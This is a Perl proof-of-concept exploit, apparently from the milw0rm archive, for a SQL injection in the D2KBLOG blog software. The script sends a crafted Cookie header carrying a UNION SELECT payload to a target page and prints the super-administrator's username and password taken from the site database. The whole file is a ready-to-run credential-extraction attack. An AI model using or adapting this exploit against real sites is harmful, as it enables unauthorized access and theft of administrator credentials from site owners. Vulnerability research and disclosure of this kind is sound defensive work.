 #!/usr/bin/perl -w 
 # D2KBLOG SQL injection 
 # Discovered by : Farhad Koosha [ farhadkey [at} kapda.ir ]
 # Exploited by : devil_box [ devil_box [at} kapda.ir ]
 # member of : Kapda.ir - Security Science Researchers Institute of Iran (persianhacker.net)

require LWP::UserAgent;
require HTTP::Request;
print "\r\n\r\n=-=-=-==================================================================-=-=-=\r\n\r\n";
print "	KAPDA - Security Science Researchers Institute of Iran\r\n\r\n";
print "	PoC for D2KBLOG SQL injection bug - Administrator Password Extractor\r\n\r\n";
print "	Original Source : http://kapda.ir/advisory-287.html (persianhacker.net)\r\n\r\n";
print "\r\n=-=-=-==================================================================-=-=-=\r\n";

 if (@ARGV != 2) 
 { 
    print "	Usage: kapda_D2KBLOG_xpl.pl [Target Domain] [Vulnerable Page]\n\r\n"; 
    print "	ex: kapda_D2KBLOG_xpl.pl www.target.com /blog/profile.asp\n\r\n";
    exit (); 
 } 


my $ua = LWP::UserAgent->new(env_proxy => 1,keep_alive => 1,timeout => 30,);

my $Path = $ARGV[0];

my $Page = $ARGV[1];

my $URL = "http://".$Path.$Page;

print "|***| Connecting to ".$URL." ...\r\n";

$r = HTTP::Request->new(GET => $URL."?action=edit");

$r->header( "Cookie" =>$Path."=memPassword=&memStatus=&memName=<!--'UNION%20ALL%20select%201,1,1,'**stxt**|UserName|:|'%2bmem_name%2b'|-=-|Password|:|'%2bmem_password%2b'|**etxt**',1,1,1,1,1,1,1,1,'Discovered%20and%20coded%20by%20farhadkey%20from%20KAPDA.ir'%20from%20blog_member%20where%20mem_status='SupAdmin'%20or%20'1'='-->" );

$res = $ua->request($r);

print "|***| Connected !\r\n";

if ($res->is_success) {

	print "|***| Extracting Username and Password ...\r\n\r\n";

	my $results = $res->content; 

	while($results=~/\"\*\*stxt\*\*(.*?)\*\*etxt\*\*\"/ig){ print "-=-> $1 \r\n"; }

	print "\r\n	Exploit by Devil_Box\r\n		Discovery by Farhad koosha\r\n\r\n";

 } else {
	die "\r\n|***| ".$res->status_line;
 }

# milw0rm.com [2006-03-09]
